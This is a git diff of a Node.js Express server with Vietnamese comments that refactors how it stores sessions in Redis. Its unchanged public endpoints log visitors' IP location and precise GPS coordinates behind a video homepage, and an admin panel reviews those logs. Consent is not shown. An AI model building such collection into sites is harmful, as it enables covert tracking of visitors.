@@ -1,5 +1,5 @@
 // ==========================================================
-// PHẦN 1: IMPORTS VÀ CẤU HÌNH BAN ĐẦU
+// PHẦN 1: IMPORTS VÀ CẤU HÌNH BAN ĐẦU (ESM)
 // ==========================================================
 import express from "express";
 import fetch from "node-fetch";
@@ -9,10 +9,10 @@ import { fileURLToPath } from "url";
 import dotenv from "dotenv";
 import multer from "multer";
 import session from "express-session";
-import * as ConnectRedisNS from "connect-redis"; // <-- tương thích v6/v7/v9
+import { RedisStore } from "connect-redis"; // v7: named export
 import { createClient } from "redis";
 
-// --- Cấu hình Biến môi trường ---
+// --- Biến môi trường ---
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 dotenv.config({ path: path.join(__dirname, ".env") });
@@ -23,49 +23,44 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
 const NODE_ENV = process.env.NODE_ENV || "development";
 
 // ==========================================================
-// PHẦN 1.1: REDIS CLIENT + STORE (khởi tạo trong hàm start())
+// PHẦN 1.1: KẾT NỐI REDIS & TẠO STORE
 // ==========================================================
-let redisClient;
-let redisStore;
+async function createRedisStore() {
+  const redisClient = createClient({
+    url: process.env.REDIS_URL || undefined, // ví dụ: redis://:pass@host:6379/0
+  });
+  redisClient.on("error", (err) => console.error("Redis Client Error:", err));
+  await redisClient.connect();
 
-// Hàm lấy lớp RedisStore tương thích mọi version connect-redis
-function resolveRedisStoreClass() {
-  // v7/v9 có thể export { RedisStore } hoặc default là class
-  // v6: default export là function(session) => class
-  const maybeDefault = ConnectRedisNS?.default ?? ConnectRedisNS;
-  const maybeClass = ConnectRedisNS?.RedisStore ?? maybeDefault;
+  const store = new RedisStore({
+    client: redisClient,
+    prefix: "myapp-session:",
+  });
 
-  // Nếu là hàm nhận 1 tham số -> kiểu v6: connectRedis(session) => class
-  if (typeof maybeClass === "function" && maybeClass.length === 1) {
-    return maybeClass(session);
-  }
-  // Ngược lại xem như class trực tiếp (v7/v9)
-  return maybeClass;
+  return { redisClient, store };
 }
 
 // ==========================================================
-// PHẦN 2: MIDDLEWARES (đăng ký sau khi có redisStore)
+// PHẦN 2: MIDDLEWARES
 // ==========================================================
-const setupMiddlewares = () => {
+function setupMiddlewares(store) {
   // Quan trọng khi chạy sau Nginx/Cloudflare/PM2 proxy (HTTPS)
   app.set("trust proxy", 1);
 
   app.use(express.json());
   app.use(express.urlencoded({ extended: true }));
 
-  // Cookie secure: chỉ bật khi thật sự chạy HTTPS trong production
   const USE_SECURE_COOKIE =
     NODE_ENV === "production" && process.env.COOKIE_SECURE !== "false";
 
   app.use(
     session({
-      store: redisStore, // lưu session vào Redis
-      secret:
-        process.env.SESSION_SECRET || "mot-chuoi-bi-mat-rat-an-toan-mac-dinh", // KHÔNG dùng mặc định này ở prod
+      store,
+      secret: process.env.SESSION_SECRET || "KHONG-DUNG-CHUOI-NAY-O-PRODUCTION", // thay bằng chuỗi mạnh trong .env
       resave: false,
       saveUninitialized: false,
       cookie: {
-        secure: USE_SECURE_COOKIE, // HTTPS thực mới bật
+        secure: USE_SECURE_COOKIE, // chỉ bật khi HTTPS thực sự
         httpOnly: true,
         sameSite: "lax",
         maxAge: 1000 * 60 * 60 * 24 * 7, // 7 ngày
@@ -74,13 +69,12 @@ const setupMiddlewares = () => {
   );
 
   app.use(express.static(path.join(__dirname, "public")));
-};
+}
 
 // --- Middleware kiểm tra đăng nhập ---
 const requireLogin = (req, res, next) => {
   if (req.session?.isLoggedIn) return next();
 
-  // Nếu là API request
   if (
     req.originalUrl.startsWith("/api/") ||
     req.originalUrl.startsWith("/admin/api/")
@@ -89,16 +83,12 @@ const requireLogin = (req, res, next) => {
       .status(401)
       .json({ message: "Phiên đăng nhập đã hết hạn. Vui lòng đăng nhập lại." });
   }
-
-  // Trang thông thường
   return res.redirect("/admin");
 };
 
 // ==========================================================
-// PHẦN 3: CÁC API CÔNG KHAI (DÀNH CHO NGƯỜI DÙNG)
+// PHẦN 3: CÁC API CÔNG KHAI
 // ==========================================================
-
-// API ghi log vị trí ước tính dựa trên IP
 app.post("/api/log-ip-location", async (req, res) => {
   const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const timestamp = new Date().toLocaleString("vi-VN", {
@@ -129,7 +119,6 @@ app.post("/api/log-ip-location", async (req, res) => {
   }
 });
 
-// API ghi log vị trí chính xác
 app.post("/api/log-precise-location", async (req, res) => {
   try {
     const { latitude, longitude } = req.body;
@@ -155,7 +144,6 @@ app.post("/api/log-precise-location", async (req, res) => {
   }
 });
 
-// API lấy video đang được kích hoạt để hiển thị trên trang chủ
 app.get("/api/active-video", async (req, res) => {
   const configPath = path.join(__dirname, "data", "config.json");
   try {
@@ -169,28 +157,22 @@ app.get("/api/active-video", async (req, res) => {
 });
 
 // ==========================================================
-// PHẦN 4: CÁC ROUTE VÀ API CỦA ADMIN
+// PHẦN 4: ROUTE/ API ADMIN
 // ==========================================================
-
-// --- Route phục vụ các trang HTML của Admin ---
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
-
 app.get("/admin", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
 
-// Đăng nhập
 app.post("/admin/login", (req, res) => {
   const password = (req.body?.password || "").toString();
-
   if (!ADMIN_PASSWORD) {
     console.warn("CẢNH BÁO: ADMIN_PASSWORD chưa được thiết lập trong .env!");
   }
   if (password && ADMIN_PASSWORD && password === ADMIN_PASSWORD) {
     req.session.isLoggedIn = true;
-    // đảm bảo session được lưu trước khi redirect
     req.session.save((err) => {
       if (err) return res.status(500).send("Lỗi lưu session");
       return res.redirect("/admin/dashboard");
@@ -200,7 +182,6 @@ app.post("/admin/login", (req, res) => {
   }
 });
 
-// Đăng xuất (tiện test)
 app.post("/admin/logout", requireLogin, (req, res) => {
   req.session.destroy(() => {
     res.clearCookie("connect.sid");
@@ -208,7 +189,6 @@ app.post("/admin/logout", requireLogin, (req, res) => {
   });
 });
 
-// Áp dụng middleware requireLogin cho các route cần bảo vệ
 app.get("/admin/dashboard", requireLogin, (req, res) => {
   res.sendFile(path.join(__dirname, "public", "dashboard.html"));
 });
@@ -216,7 +196,6 @@ app.get("/admin/videos", requireLogin, (req, res) => {
   res.sendFile(path.join(__dirname, "public", "videos-manager.html"));
 });
 
-// --- API Admin để quản lý LOG (Bảo vệ bằng middleware) ---
 app.get("/admin/api/logs/:logType", requireLogin, async (req, res) => {
   const { logType } = req.params;
   if (!["ip", "precise"].includes(logType)) {
@@ -269,7 +248,7 @@ app.post("/admin/api/clear-logs/:logType", requireLogin, async (req, res) => {
   }
 });
 
-// --- API Admin để quản lý VIDEO (Bảo vệ bằng middleware) ---
+// --- VIDEO (Admin) ---
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
     const destPath = path.join(__dirname, "public", "videos");
@@ -349,7 +328,7 @@ app.post("/api/admin/videos/delete", requireLogin, async (req, res) => {
         await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2));
       }
     } catch {
-      // nếu chưa có config.json thì bỏ qua
+      /* ignore if no config.json */
     }
 
     res.json({ message: `Đã xóa video '${fileName}' thành công.` });
@@ -360,23 +339,12 @@ app.post("/api/admin/videos/delete", requireLogin, async (req, res) => {
 });
 
 // ==========================================================
-// PHẦN 5: KHỞI ĐỘNG SERVER (sau khi kết nối Redis)
+// PHẦN 5: KHỞI ĐỘNG
 // ==========================================================
 async function start() {
   try {
-    redisClient = createClient({
-      url: process.env.REDIS_URL || undefined, // ví dụ: redis://:pass@host:6379/0
-    });
-    redisClient.on("error", (err) => console.error("Redis Client Error:", err));
-    await redisClient.connect();
-
-    const RedisStoreClass = resolveRedisStoreClass();
-    redisStore = new RedisStoreClass({
-      client: redisClient,
-      prefix: "myapp-session:",
-    });
-
-    setupMiddlewares();
+    const { store } = await createRedisStore();
+    setupMiddlewares(store);
 
     app.listen(PORT, () => {
       console.log(`Server đang chạy tại http://localhost:${PORT}`);
@@ -393,5 +361,4 @@ async function start() {
     process.exit(1);
   }
 }
-
 start();
